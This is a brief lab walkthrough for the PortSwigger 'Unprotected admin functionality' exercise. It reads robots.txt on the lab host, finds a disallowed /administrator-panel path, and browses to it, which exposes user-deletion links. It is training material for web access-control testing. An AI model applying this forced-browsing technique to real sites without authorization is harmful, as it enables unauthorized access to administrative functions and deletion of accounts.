# 1 [Lab: Unprotected admin functionality](https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality)

This lab has an unprotected admin panel.

Solve the lab by deleting the user carlos.

add to URL:

```bash
robots.txt
```

```bash
https://0aba0081040734fd80a385cd002c0010.web-security-academy.net/robots.txt
```

res:

```bash
User-agent: *
Disallow: /administrator-panel
```

add to URL:

```bash
/administrator-panel
```

send in URL:

```bash
https://0aba0081040734fd80a385cd002c0010.web-security-academy.net/administrator-panel
```

res:

```bash
Users
wiener - Delete
carlos - Delete
```
